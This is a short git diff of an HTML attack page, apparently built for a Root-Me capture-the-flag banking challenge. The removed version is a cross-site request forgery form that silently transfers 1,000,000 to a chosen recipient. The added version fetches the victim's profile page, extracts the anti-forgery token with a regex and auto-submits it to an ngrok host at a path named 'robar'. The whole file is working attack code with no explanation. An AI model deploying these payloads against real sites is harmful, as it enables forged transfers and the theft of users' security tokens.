@@ -1,12 +1,19 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <form action="https://bankme-1.challenges.pro.root-me.org/transfer" method="POST">
-      <input type="hidden" name="recipient" value="prueba">
-      <input type="hidden" name="amount" value="1000000">
+    <form action="https://48bf-83-213-114-176.ngrok-free.app/robar" method="POST">
+      <input type="hidden" name="token" value="">
     </form>
+
     <script>
-      document.forms[0].submit();
+      fetch("https://bankme-2.challenges.pro.root-me.org/profile")
+      .then(response => response.text())
+      .then(data => {
+        let token = data.match(/name="token" value="(.*?)"/)[1];
+        document.querySelector('input[name="token"]').value = token;
+        document.forms[0].submit();
+      });
     </script>
+
   </body>
 </html>
